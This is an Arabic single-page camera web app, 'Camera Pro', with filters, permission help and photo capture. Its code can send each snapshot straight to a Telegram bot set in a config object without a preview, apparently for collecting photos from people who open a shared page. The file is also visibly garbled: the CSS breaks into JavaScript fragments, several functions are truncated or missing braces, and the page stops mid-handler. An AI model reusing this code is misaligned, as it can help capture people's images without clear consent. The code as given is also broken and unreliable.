<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#06060a">
<title>Camera Pro</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  *:focus { outline: none; }

  :root {
    --bg: #06060a;
    --panel: rgba(18, 18, 28, 0.72);
    --panel-strong: rgba(24, 24, 36, 0.92);
    --accent: #fffc00;
    --accent-2: #00e5ff;
    --accent-3: #b537f2;
    --text: #ffffff;
    --muted: #8a8aa3;
    --border: rgba(255,255,255,0.08);
    --border-strong: rgba(255,255,255,0.16);
    --success: #00e676;
    --danger: #ff3b5c;
  }

  html, body {
    height: 100%;
    width: 100%;
    overflow: hidden;
    background: var(--bg);
    color: var(--text);
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    user-select: none;
    -webkit-user-select: none;
    position: fixed;
    inset: 0;
    overscroll-behavior: none;
  }

  #app { position: fixed; inset: 0; display: flex; flex-direction: column; }

  /* ================= SPLASH ================= */
  #splash {
    position: fixed;
    inset: 0;
    z-index: 500;
    background:
      radial-gradient(circle at 30% 20%, rgba(181,55,242,0.35), transparent 55%),
      radial-gradient(circle at 70% 80%, rgba(0,229,255,0.30), transparent 55%),
      radial-gradient(circle at 50% 50%, rgba(255,252,0,0.08), transparent 70%),
      #06060a;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 28px;
    transition: opacity 0.7s ease, visibility 0.7s;
  }

  #splash.hide { opacity: 0; visibility: hidden; pointer-events: none; }

  .splash-logo {
    width: 120px;
    height: 120px;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    animation: logoPop 0.9s cubic-bezier(0.34, 1.56, 0.64, 1) both;
  }

  .splash-logo::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: 32px;
    background: conic-gradient(from 0deg, #fffc00, #ff5e7e, #b537f2, #00e5ff, #fffc00);
    animation: rotate 4s linear infinite;
    filter: blur(0.5px);
  }

  .splash-logo::after {
    content: '';
    position: absolute;
    inset: 4px;
    border-radius: 28px;
    background: #0a0a12;
  }

  .splash-logo svg {
    position: relative;
    z-index: 2;
    width: 62px;
    height: 62px;
    stroke: #fff;
    fill: none;
    stroke-width: 1.8;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  @keyframes rotate { to { transform: rotate(360deg); } }
  @keyframes logoPop {
    0% { transform: scale(0.4) rotate(-15deg); opacity: 0; }
    100% { transform: scale(1) rotate(0); opacity: 1; }
  }

  .splash-title {
    font-size: 28px;
    font-weight: 900;
    letter-spacing: 0.5px;
    background: linear-gradient(135deg, #fffc00, #ff5e7e, #b537f2, #00e5ff);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 3s ease infinite, fadeUp 0.7s 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
    opacity: 0;
  }

  .splash-sub {
    font-size: 12px;
    color: var(--muted);
    letter-spacing: 3px;
    text-transform: uppercase;
    opacity: 0;
    animation: fadeUp 0.7s 0.55s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
  }
  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(15px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .splash-loader {
    position: absolute;
    bottom: 60px;
    width: 180px;
    height: 3px;
    background: rgba(255,255,255,0.08);
    border-radius: 3px;
    overflow: hidden;
    opacity: 0;
    animation: fadeUp 0.5s 0.8s forwards;
  }

  .splash-loader::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(90deg, #fffc00, #b537f2, #00e5ff);
    border-radius: 3px;
    transform-origin: right;
    animation: loadBar 2.4s cubic-bezier(0.65, 0, 0.35, 1) forwards;
  }

  @keyframes loadBar {
    0% { transform: scaleX(0); }
    100% { transform: scaleX(1); }
  }

  /* ================= START SCREEN ================= */
  #start-screen {
    position: fixed;
    inset: 0;
    z-index: 300;
    background:
      radial-gradient(circle at 20% 20%, rgba(181,55,242,0.25), transparent 50%),
      radial-gradient(circle at 80% 80%, rgba(0,229,255,0.20), transparent 50%),
      #06060a;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 22px;
    padding: 40px 28px;
    text-align: center;
    transition: opacity 0.4s ease, visibility 0.4s;
    overflow-y: auto;
  }

  #start-screen.hide { opacity: 0; visibility: hidden; pointer-events: none; }

  .start-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 8px 18px;
    border-radius: 100px;
    background: rgba(255,255,255,0.05);
    border: 1px solid var(--border-strong);
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 1.5px;
    color: var(--muted);
    text-transform: uppercase;
    animation: fadeUp 0.6s 0.1s both;
  }

  .start-badge .dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: var(--success);
    box-shadow: 0 0 10px var(--success);
    animation: pulse 1.6s ease-in-out infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(0.85); }
  }

  .start-icon {
    width: 88px;
    height: 88px;
    border-radius: 26px;
    background: linear-gradient(135deg, rgba(255,252,0,0.15), rgba(181,55,242,0.15));
    border: 1px solid var(--border-strong);
    display: flex;
    align-items: center;
    justify-content: center;
    animation: fadeUp 0.6s 0.2s both;
    position: relative;
    overflow: hidden;
  }

  .start-icon::before {
    content: '';
    position: absolute;
    inset: -50%;
    background: conic-gradient(from 0deg, transparent, rgba(255,252,0,0.3), transparent);
    animation: rotate 3s linear infinite;
  }

  .start-icon svg {
    position: relative;
    width: 44px;
    height: 44px;
    stroke: url(#gradIcon);
    fill: none;
    stroke-width: 1.6;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  #start-screen h1 {
    font-size: clamp(28px, 7vw, 40px);
    font-weight: 900;
    line-height: 1.2;
    background: linear-gradient(135deg, #ffffff 0%, #fffc00 50%, #00e5ff 100%);
    background-size: 200% 200%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 4s ease infinite, fadeUp 0.6s 0.3s both;
  }

  #start-screen p {
    color: var(--muted);
    font-size: 14px;
    line-height: 1.9;
    max-width: 340px;
    animation: fadeUp 0.6s 0.4s both;
  }

  #start-btn {
    margin-top: 14px;
    background: linear-gradient(135deg, #fffc00, #ffd900);
    color: #000;
    border: none;
    padding: 18px 52px;
    border-radius: 22px;
    font-family: inherit;
    font-size: 16px;
    font-weight: 800;
    cursor: pointer;
    transition: transform 0.15s, box-shadow 0.3s;
    box-shadow: 0 12px 40px rgba(255, 252, 0, 0.28), inset 0 -2px 0 rgba(0,0,0,0.1);
    animation: fadeUp 0.6s 0.5s both;
    display: inline-flex;
    align-items: center;
    gap: 10px;
    justify-content: center;
    min-width: 220px;
  }

  #start-btn svg {
    width: 20px;
    height: 20px;
    stroke: #000;
    fill: none;
    stroke-width: 2.4;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  #start-btn:active { transform: scale(0.95); }
  #start-btn:disabled { opacity: 0.7; cursor: wait; }

  .start-features {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
    justify-content: center;
    margin-top: 20px;
    animation: fadeUp 0.6s 0.6s both;
  }

  .feature-chip {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 8px 14px;
    border-radius: 100px;
    background: rgba(255,255,255,0.04);
    border: 1px solid var(--border);
    font-size: 12px;
    color: var(--muted);
    font-weight: 600;
  }

  .feature-chip svg {
    width: 14px;
    height: 14px;
    stroke: var(--accent);
    fill: none;
    stroke-width: 2.2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  /* ================= ERROR SCREEN ================= */
  #error-screen {
    position: fixed;
    inset: 0;
    z-index: 350;
    background: radial-gradient(circle at 50% 40%, #1a0a14, #06060a);
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 24px;
    text-align: center;
    gap: 16px;
    overflow-y: auto;
  }
  #error-screen.show { display: flex; }

  #error-screen .err-icon {
    width: 76px; height: 76px;
    border-radius: 24px;
    background: rgba(255,59,92,0.12);
    border: 1px solid rgba(255,59,92,0.3);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  #error-screen .err-icon svg {
    width: 36px; height: 36px;
    stroke: var(--danger);
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }
  #error-screen h2 { font-size: 20px; font-weight: 800; }
  #error-screen p {
    color: var(--muted);
    font-size: 14px;
    line-height: 1.8;
    max-width: 340px;
  }

  #error-steps {
    background: rgba(255,255,255,0.04);
    border: 1px solid var(--border-strong);
    border-radius: 16px;
    padding: 16px 20px;
    max-width: 360px;
    width: 100%;
    text-align: right;
    margin-top: 6px;
  }
  .steps-title {
    font-size: 13px;
    font-weight: 700;
    color: var(--accent);
    margin-bottom: 10px;
  }
  #error-steps-list {
    list-style: none;
    padding: 0;
    margin: 0;
    counter-reset: step;
  }
  #error-steps-list li {
    counter-increment: step;
    position: relative;
    padding-right: 32px;
    padding-top: 6px;
    padding-bottom: 6px;
    font-size: 13px;
    color: var(--text);
    line-height: 1.6;
  }
  #error-steps-list li::before {
    content: counter(step);
    position: absolute;
    right: 0;
    top: 6px;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--accent), #ffd900);
    color: #000;
    font-size: 11px;
    font-weight: 800;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .err-actions {
    display: flex;
    gap: 10px;
    margin-top: 8px;
    flex-wrap: wrap;
    justify-content: center;
  }

  #error-screen button {
    background: linear-gradient(135deg, var(--accent), #ffd900);
    border: none;
    color: #000;
    padding: 14px 28px;
    border-radius: 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    transition: transform 0.15s;
  }
  #error-screen button:active { transform: scale(0.95); }

  #error-screen #error-reload {
    background: rgba(255,255,255,0.08);
    border: 1px solid var(--border-strong);
    color: #fff;
  }

  /* ================= CAMERA VIEW ================= */
  #camera-view {
    position: fixed;
    inset: 0;
    display: none;
    background: #000;
    z-index: 100;
  }

  #camera-view.active { display: block; }

  #video {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    background: #000;
    transform: scaleX(-1);
  }

  #video.mirror-off { transform: scaleX(1); }

  #filter-overlay {
    position: absolute;
    inset: 0;
    pointer-events: none;
    transition: background 0.3s;
    z-index: 2;
  }

  .corner {
    position: absolute;
    width: 26px;
    height: 26px;
    border-color: rgba(255,255,255,0.4);
    border-style: solid;
    z-index: 3;
    pointer-events: none;
    transition: all 0.3s;
  }
  .corner.tl { top: 80px; left: 20px; border-width: 2px 0 0 2px; border-radius: 8px 0 0 0; }
  .corner.tr { top: 80px; right: 20px; border-width: 2px 2px 0 0; border-radius: 0 8px 0 0; }
  .corner.bl { bottom: 200px; left: 20px; border-width: 0 0 2px 2px; border-radius: 0 0 0 8px; }
  .corner.br { bottom: 200px; right: 20px; border-width: 0 2px 2px 0; border-radius: 0 0 8px 0; }

  /* ================= TOP BAR ================= */
  #top-bar {
    position: absolute;
    top: 0; left: 0; right: 0;
    padding: 16px 20px;
    padding-top: calc(16px + env(safe-area-inset-top));
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
    z-index: 10;
    pointer-events: none;
  }

  .top-btn {
    width: 46px; height: 46px;
    border-radius: 16px;
    background: var(--panel);
    backdrop-filter: blur(22px) saturate(180%);
    -webkit-backdrop-filter: blur(22px) saturate(180%);
    border: 1px solid var(--border-strong);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: transform 0.15s, background 0.2s;
    pointer-events: auto;
  }

  .top-btn:active { transform: scale(0.9); background: rgba(40,40,60,0.9); }
  .top-btn svg {
    width: 20px; height: 20px;
    stroke: #fff;
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  /* ================= FILTERS BAR ================= */
  #filters-bar {
    position: absolute;
    bottom: 175px;
    left: 0; right: 0;
    display: flex;
    gap: 10px;
    padding: 12px 20px;
    overflow-x: auto;
    scrollbar-width: none;
    z-index: 10;
    pointer-events: auto;
    -webkit-overflow-scrolling: touch;
  }
  #filters-bar::-webkit-scrollbar { display: none; }

  .filter-item {
    flex-shrink: 0;
    width: 62px;
    height: 78px;
    border-radius: 18px;
    border: 2px solid transparent;
    background: var(--panel);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 4px;
    cursor: pointer;
    transition: all 0.22s cubic-bezier(0.34, 1.56, 0.64, 1);
    padding: 6px;
  }

  .filter-item .swatch {
    width: 38px;
    height: 38px;
    border-radius: 12px;
    flex-shrink: 0;
    box-shadow: inset 0 0 0 1px rgba(255,255,255,0.1);
  }

  .filter-item .label {
    font-size: 9.5px;
    color: #fff;
    font-weight: 600;
    white-space: nowrap;
  }

  .filter-item.active {
    border-color: var(--accent);
    transform: translateY(-6px) scale(1.06);
    box-shadow: 0 0 24px rgba(255, 252, 0, 0.5), 0 8px 20px rgba(0,0,0,0.4);
    background: var(--panel-strong);
  }

  /* ================= BOTTOM BAR ================= */
  #bottom-bar {
    position: absolute;
    bottom: 0; left: 0; right: 0;
    padding: 20px 26px;
    padding-bottom: calc(24px + env(safe-area-inset-bottom));
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: linear-gradient(to top, rgba(0,0,0,0.75), transparent);
    z-index: 10;
    pointer-events: none;
  }

  .side-btn {
    width: 54px; height: 54px;
    border-radius: 18px;
    background: var(--panel);
    backdrop-filter: blur(22px) saturate(180%);
    -webkit-backdrop-filter: blur(22px) saturate(180%);
    border: 1px solid var(--border-strong);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: transform 0.15s, background 0.2s;
    pointer-events: auto;
  }
  .side-btn:active { transform: scale(0.9); background: rgba(40,40,60,0.9); }
  .side-btn svg {
    width: 22px; height: 22px;
    stroke: #fff;
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .side-btn.active {
    background: rgba(255, 252, 0, 0.15);
    border-color: rgba(255, 252, 0, 0.4);
  }
  .side-btn.active svg { stroke: var(--accent); }

  #shutter {
    width: 88px; height: 88px;
    border-radius: 50%;
    background: transparent;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    position: relative;
    pointer-events: auto;
    transition: transform 0.1s;
  }

  #shutter:active { transform: scale(0.92); }

  #shutter .ring {
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 4px solid rgba(255,255,255,0.95);
    box-shadow: 0 0 24px rgba(255,255,255,0.35), inset 0 0 12px rgba(255,255,255,0.15);
    transition: all 0.2s;
  }

  #shutter .core {
    position: absolute;
    inset: 8px;
    border-radius: 50%;
    background: linear-gradient(135deg, #fff, #e8e8e8);
    transition: all 0.15s;
    box-shadow: inset 0 -3px 8px rgba(0,0,0,0.1);
  }

  #shutter .core::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--accent), #ffd900);
    opacity: 0;
    transition: opacity 0.2s;
  }

  #shutter.flash .core::before { opacity: 1; }
  #shutter.flash .core { transform: scale(0.9); }
  #shutter.flash .ring { border-color: var(--accent); }

  #flash {
    position: absolute;
    inset: 0;
    background: #fff;
    opacity: 0;
    pointer-events: none;
    z-index: 50;
    transition: opacity 0.25s;
  }
  #flash.on { opacity: 0.92; transition: none; }

  /* ================= PREVIEW ================= */
  #preview-screen {
    position: fixed;
    inset: 0;
    background: #000;
    z-index: 400;
    display: none;
    flex-direction: column;
    opacity: 0;
    transition: opacity 0.3s;
  }
  #preview-screen.show { display: flex; opacity: 1; }

  #preview-img {
    flex: 1;
    width: 100%;
    height: 100%;
    object-fit: contain;
    background: #000;
    display: block;
  }

  #preview-actions {
    padding: 20px;
    padding-bottom: calc(20px + env(safe-area-inset-bottom));
    display: flex;
    justify-content: space-around;
    align-items: center;
    background: linear-gradient(to top, rgba(6,6,10,0.98), rgba(6,6,10,0.85));
    backdrop-filter: blur(20px);
    border-top: 1px solid var(--border);
  }

  .action-btn {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    background: transparent;
    border: none;
    color: var(--text);
    font-family: inherit;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    padding: 10px 16px;
    border-radius: 16px;
    transition: background 0.2s, transform 0.1s;
  }
  .action-btn:active { transform: scale(0.94); background: rgba(255,255,255,0.08); }
  .action-btn svg {
    width: 26px; height: 26px;
    stroke: #fff;
    fill: none;
    stroke-width: 1.8;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .action-btn.primary {
    background: linear-gradient(135deg, var(--accent), #ffd900);
    color: #000;
    padding: 12px 22px;
    border-radius: 20px;
    box-shadow: 0 8px 30px rgba(255, 252, 0, 0.3);
  }
  .action-btn.primary svg { stroke: #000; stroke-width: 2.2; }
  .action-btn.primary:active { background: #ffd900; }

  /* ================= TOAST ================= */
  #toast {
    position: fixed;
    bottom: calc(30px + env(safe-area-inset-bottom));
    left: 50%;
    transform: translateX(-50%) translateY(120px);
    background: var(--panel-strong);
    backdrop-filter: blur(24px) saturate(180%);
    -webkit-backdrop-filter: blur(24px) saturate(180%);
    border: 1px solid var(--border-strong);
    padding: 12px 22px;
    border-radius: 100px;
    font-size: 13.5px;
    font-weight: 600;
    color: #fff;
    z-index: 600;
    transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), background 0.3s, border-color 0.3s;
    display: flex;
    align-items: center;
    gap: 10px;
    max-width: 90vw;
    box-shadow: 0 12px 40px rgba(0,0,0,0.5);
    pointer-events: none;
  }
  #toast.show { transform: translateX(-50%) translateY(0); }
  #toast.success { border-color: rgba(0,230,118,0.5); }

/* ============================================================

const ICONS = {
  success: '<path d="M20 6L9 17l-5-5"/>',

function showToast(msg, type = 'info', duration = 2500) {

  toastIcon.className = 'toast-icon';
  toastIcon.innerHTML = ICONS[type] || ICONS.info;

function hideLoading() { loading.classList.remove('show'); }

/* ============================================================
   🔐 طلب صلاحية الكاميرا
   ============================================================ */
async function requestCameraPermission() {
  if (!navigator.permissions || !navigator.permissions.query) {
    return 'prompt';
  }
  try {
    const result = await navigator.permissions.query({ name: 'camera' });
    return result.state;
  } catch (e) {
    return 'prompt';
  }
}

/* ============================================================
   🌐 كشف نوع المتصفح
   ============================================================ */
function detectBrowser() {
  const ua = navigator.userAgent;
  return {
    isIOS:     /iPhone|iPad|iPod/.test(ua),
    isSafari:  /^((?!chrome|android).)*safari/i.test(ua),
    isChrome:  /chrome/i.test(ua) && !/edge|opr/i.test(ua),
    isFirefox: /firefox/i.test(ua),
    isEdge:    /edg/i.test(ua),
    isSamsung: /samsungbrowser/i.test(ua),
    isAndroid: /android/i.test(ua),
  };
}

function getPermissionInstructions() {
  const b = detectBrowser();

  if (b.isIOS || b.isSafari) {
    return {
      title: 'اسمح بالكاميرا من Safari',
      steps: [
        'افتح الإعدادات في الآيفون',
        'انزل لـ Safari ثم Camera',
        'اختر Ask أو Allow',
        'ارجع للصفحة وأعد تحميلها',
      ],
    };

  if (b.isChrome || b.isEdge) {
    return {
      title: 'اسمح بالكاميرا من المتصفح',
      steps: [
        'اضغط على أيقونة القفل 🔒 جنب الرابط',

        'اضبط Camera على Allow',
        'أعد تحميل الصفحة',
      ],
    };
  }

  if (b.isFirefox) {
    return {
      title: 'اسمح بالكاميرا من Firefox',
      steps: [

    ],
  };
}

/* ============================================================
   📷 تشغيل الكاميرا
   ============================================================ */
async function startCamera() {
  if (state.isStarting) return false;
  state.isStarting = true;

  try {
    // 1. تحقق من دعم المتصفح
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw {
        name: 'NotSupportedError',
        message: 'متصفحك ما بيدعمش الوصول للكاميرا. جرّب Chrome أو Safari حديث.',
      };
    }

    // 2. تحقق من البروتوكول
    const isLocalhost = ['localhost', '127.0.0.1'].includes(location.hostname);
    const isHttps = location.protocol === 'https:';
    if (!isHttps && !isLocalhost) {
      throw {
        name: 'InsecureContextError',
        message: 'لازم تفتح الصفحة عبر HTTPS. ارفع الملف على Netlify Drop وشغّله من اللينك.',
      };
    }

    // 3. أوقف أي ستريم قديم
    if (state.stream) {
      state.stream.getTracks().forEach(t => t.stop());
      state.stream = null;
    }

    // 4. إشعار
    showToast('بانتظار السماح بالكاميرا...', 'info', 3000);

    // 5. اطلب الصلاحية
    const constraints = {
      video: {
        facingMode: { ideal: state.facingMode },
        width:  { ideal: 1280 },
        height: { ideal: 720 },
      },
      audio: false,
    };

    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia(constraints);
    } catch (err) {
      // جرّب بدون قيود لو فشل
      if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      } else {
        throw err;
      }
    }

    state.stream = stream;
    video.srcObject = stream;

    // 6. انتظر جاهزية الفيديو
    await new Promise((resolve, reject) => {
      const onLoaded = () => {
        video.removeEventListener('loadedmetadata', onLoaded);
        resolve();
      };
      video.addEventListener('loadedmetadata', onLoaded);
      setTimeout(() => reject(new Error('تأخر تحميل الفيديو')), 8000);
    });

    try {
      await video.play();
    } catch (e) {
      console.warn('video.play() failed:', e);
    }

    state.videoReady = true;
    state.isStarting = false;

    if (state.facingMode === 'user') {
      video.classList.remove('mirror-off');
    } else {
      video.classList.add('mirror-off');
    }

    return true;

  } catch (err) {
    state.isStarting = false;
    console.error('Camera error:', err);
    showPermissionError(err);
    return false;
  }
}

/* ============================================================
   🚨 عرض خطأ الصلاحية
   ============================================================ */
function showPermissionError(err) {
  const name = err.name || '';

  let title = 'تعذّر الوصول للكاميرا';
  let message = err.message || 'حصل خطأ غير متوقع';
  let showSteps = false;

  if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
    title = 'المتصفح رافض صلاحية الكاميرا';
    message = 'لازم تسمح للموقع بالوصول للكاميرا من إعدادات المتصفح.';
    showSteps = true;
  } else if (name === 'NotFoundError' || name === 'DevicesNotFoundError') {
    title = 'لا توجد كاميرا';
    message = 'مفيش كاميرا متاحة على الجهاز ده. جرّب من موبايل أو لابتوب فيه كاميرا.';
  } else if (name === 'NotReadableError' || name === 'TrackStartError') {
    title = 'الكاميرا مشغولة';
    message = 'الكاميرا مستخدمة في تطبيق تاني. اقفل Zoom / Teams / أي تاب فيه كاميرا شغالة وحاول تاني.';
  } else if (name === 'InsecureContextError') {
    title = 'الرابط غير آمن';
    message = err.message;
  } else if (name === 'NotSupportedError') {
    title = 'المتصفح ما بيدعمش الكاميرا';
    message = err.message;
  } else if (name === 'OverconstrainedError') {
    title = 'إعدادات الكاميرا غير مناسبة';
    message = 'جرّب تبديل الكاميرا أو أعد تحميل الصفحة.';
  }

  errorMsg.textContent = message;

  const errTitleEl = document.querySelector('#error-screen h2');
  if (errTitleEl) errTitleEl.textContent = title;

  const stepsBox = $('error-steps');
  const stepsList = $('error-steps-list');
  if (showSteps) {
    const inst = getPermissionInstructions();
    const instTitle = $('error-steps-title');
    if (instTitle) instTitle.textContent = inst.title;
    if (stepsList) {
      stepsList.innerHTML = inst.steps.map(s => `<li>${s}</li>`).join('');
    }
    if (stepsBox) stepsBox.style.display = 'block';
  } else {
    if (stepsBox) stepsBox.style.display = 'none';
  }

  errorScreen.classList.add('show');
  startScreen.classList.add('hide');
  cameraView.classList.remove('active');
}

/* ============================================================
   🎨 تطبيق الفلتر
   ============================================================ */
function applyFilter(filter) {
  state.currentFilter = filter;

  if (!state.filterEnabled) {
    video.style.filter = 'none';
    filterOverlay.style.background = 'transparent';
  } else {
    video.style.filter = filter.css;
    filterOverlay.style.background = filter.overlay;
  }

  document.querySelectorAll('.filter-item').forEach(el => {
    el.classList.toggle('active', el.dataset.id === filter.id);
  });
}

/* ============================================================
   🧩 بناء شريط الفلاتر
   ============================================================ */
function buildFiltersBar() {
  filtersBar.innerHTML = '';
  FILTERS.forEach(f => {
    const el = document.createElement('div');
    el.className = 'filter-item' + (f.id === state.currentFilter.id ? ' active' : '');
    el.dataset.id = f.id;
    el.innerHTML = `
      <div class="swatch" style="background:${f.swatch}"></div>
      <div class="label">${f.name}</div>
    `;
    el.addEventListener('click', () => {
      applyFilter(f);
      if (navigator.vibrate) navigator.vibrate(8);
    });
    filtersBar.appendChild(el);
  });
}

/* ============================================================
   📸 التقاط الصورة
   ============================================================ */
async function capturePhoto() {
  if (!state.videoReady) {
    showToast('الكاميرا مش جاهزة بعد', 'error');
    return;
  }

  flash.classList.add('on');
  setTimeout(() => flash.classList.remove('on'), 100);

  shutter.classList.add('flash');
  setTimeout(() => shutter.classList.remove('flash'), 200);

  if (navigator.vibrate) navigator.vibrate(25);

  try {
    const vw = video.videoWidth;
    const vh = video.videoHeight;
    if (!vw || !vh) throw new Error('الفيديو لسه مش جاهز');

    const canvas = document.createElement('canvas');
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');

    if (state.facingMode === 'user') {
      ctx.translate(vw, 0);
      ctx.scale(-1, 1);
    }

    if (state.filterEnabled) {
      ctx.filter = state.currentFilter.css;
    }
    ctx.drawImage(video, 0, 0, vw, vh);
    ctx.filter = 'none';
    ctx.setTransform(1, 0, 0, 1, 0, 0);

    if (state.filterEnabled && state.currentFilter.overlay && state.currentFilter.overlay !== 'transparent') {
      ctx.fillStyle = state.currentFilter.overlay;
      ctx.fillRect(0, 0, vw, vh);
    }

    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.92));
    if (!blob) throw new Error('فشل إنشاء الصورة');

    state.capturedBlob = blob;
    state.capturedDataUrl = canvas.toDataURL('image/jpeg', 0.92);

    if (CONFIG.AUTO_UPLOAD) {
      await uploadToTelegram(blob);
    } else {
      showPreview();
    }
  } catch (err) {
    console.error(err);
    showToast('فشل التقاط الصورة: ' + err.message, 'error', 3500);
  }
}

/* ============================================================
   🖼️ معاينة
   ============================================================ */
function showPreview() {
  if (!state.capturedDataUrl) return;
  previewImg.src = state.capturedDataUrl;
  previewScreen.classList.add('show');
  pauseCamera();
}

function pauseCamera() {
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(t => t.enabled = false);
  }
}

function resumeCamera() {
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(t => t.enabled = true);
  }
}

function hidePreview() {
  previewScreen.classList.remove('show');
  state.capturedBlob = null;
  state.capturedDataUrl = null;
  previewImg.src = '';
  resumeCamera();
}

/* ============================================================
   📤 رفع على تيليجرام
   ============================================================ */
async function uploadToTelegram(blob) {
  if (!blob) blob = state.capturedBlob;
  if (!blob) { showToast('لا توجد صورة للرفع', 'error'); return; }

  showLoading('جارٍ الرفع على تيليجرام...');
  pauseCamera();

  try {
    const form = new FormData();
    form.append('chat_id', CONFIG.CHAT_ID);
    form.append('caption', `📸 صورة جديدة\n🕐 ${new Date().toLocaleString('ar-EG')}`);
    form.append('photo', blob, `photo_${Date.now()}.jpg`);

    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
    const res = await fetch(url, { method: 'POST', body: form });
    const data = await res.json();

    hideLoading();

    if (data.ok) {
      showToast('تم الرفع على تيليجرام بنجاح', 'success', 2800);
      state.capturedBlob = null;
      state.capturedDataUrl = null;
      previewScreen.classList.remove('show');
      resumeCamera();
    } else {
      throw new Error(data.description || 'فشل الرفع');
    }
  } catch (err) {
    hideLoading();
    console.error(err);
    showToast('فشل الرفع: ' + err.message, 'error', 4500);
    if (state.capturedDataUrl) showPreview();
    else resumeCamera();
  }
}

/* ============================================================
   💾 تحميل محلي
   ============================================================ */
function downloadPhoto() {
  if (!state.capturedDataUrl) { showToast('لا توجد صورة', 'error'); return; }
  const a = document.createElement('a');
  a.href = state.capturedDataUrl;
  a.download = `photo_${Date.now()}.jpg`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  showToast('تم حفظ الصورة', 'success', 2000);
}

/* ============================================================
   🔄 تبديل الكاميرا
   ============================================================ */
async function flipCamera() {
  state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
  showToast('جارٍ تبديل الكاميرا...', 'info', 1200);
  await startCamera();
}

/* ============================================================
   🎛️ ربط الأحداث
   ============================================================ */
$('start-btn').addEventListener('click', async (e) => {
  const btn = e.currentTarget;
  const originalHTML = btn.innerHTML;

  btn.disabled = true;
  btn.innerHTML = '<span class="btn-spinner"></span> <span>جارٍ التشغيل...</span>';

  // 1. تحقق من الصلاحية الحالية
  const permState = await requestCameraPermission();

  if (permState === 'denied') {
    btn.disabled = false;
    btn.innerHTML = originalHTML;
    showPermissionError({
      name: 'NotAllowedError',
      message: 'الصلاحية مرفوضة. اسمح بالكاميرا من إعدادات المتصفح ثم أعد المحاولة.',
    });
    return;
  }

  // 2. شغّل الكاميرا
  const ok = await startCamera();

  if (ok) {
    startScreen.classList.add('hide');
    cameraView.classList.add('active');
    setTimeout(() => {
      startScreen.style.display = 'none';
    }, 450);
